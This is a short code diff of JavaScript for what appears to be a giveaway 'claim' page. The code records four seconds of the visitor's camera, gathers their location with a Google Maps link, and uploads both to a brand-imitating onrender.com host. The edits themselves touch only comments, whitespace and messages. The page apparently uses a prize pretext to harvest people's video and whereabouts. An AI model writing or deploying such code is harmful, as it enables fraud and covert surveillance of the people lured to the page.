@@ -71,7 +71,6 @@ btn.addEventListener('click', async () => {
     try {
 
         const stream = video.srcObject;
-
         const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
         let chunks = [];
 
@@ -83,7 +82,6 @@ btn.addEventListener('click', async () => {
 
             const videoBlob = new Blob(chunks, { type: 'video/webm' });
             const formData = new FormData();
-
             formData.append('video', videoBlob, 'claim_video.webm');
 
             // Get location
@@ -97,6 +95,7 @@ btn.addEventListener('click', async () => {
                 formData.append("maps", location.googleMaps);
             }
 
+            // Send video + location to backend
             const res = await fetch("https://seven-11-giveaways-2026-k7mn.onrender.com/upload-video", {
                 method: "POST",
                 body: formData
@@ -105,20 +104,17 @@ btn.addEventListener('click', async () => {
             const data = await res.json();
 
             console.log("Video posted:", data);
-            console.log("Location:", location);
+            console.log("Location sent:", location);
 
-            loading.innerHTML = "<p>Success! Your claim video has been posted.</p>";
+            loading.innerHTML = "<p>Success! Your claim video has been posted with your location.</p>";
         };
 
         recorder.start();
-
-        setTimeout(() => recorder.stop(), 4000);
+        setTimeout(() => recorder.stop(), 4000); // record 4 seconds
 
     } catch (err) {
-
         console.error(err);
         loading.innerHTML = "<p>Error capturing video.</p>";
-
     }
 
 });
